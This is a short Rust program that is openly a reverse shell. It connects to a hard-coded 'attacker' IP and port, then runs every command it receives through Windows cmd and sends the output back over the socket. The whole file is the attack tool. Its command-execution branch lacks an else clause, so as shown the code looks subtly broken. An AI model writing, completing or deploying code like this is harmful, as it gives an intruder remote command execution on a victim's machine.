use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{BufRead, Write, BufReader};

fn main() {
    // Change these to the attacker's IP and port
    let attacker_ip = "192.168.88.98";
    let attacker_port = "4445";

    let server_address = format!("{}:{}", attacker_ip, attacker_port);
    if let Ok(mut stream) = TcpStream::connect(server_address) {
        let mut reader = BufReader::new(stream.try_clone().unwrap());

        loop {
            let mut command = String::new();
            if reader.read_line(&mut command).unwrap() == 0 {
                break;
            }

            if command.trim() == "exit" {
                break;
            }

            let output = if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .args(&["/C", &command])
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()
                    .expect("failed to execute process")
            };

            stream.write_all(&output.stdout).unwrap();
            stream.write_all(&output.stderr).unwrap();
        }
    }
}
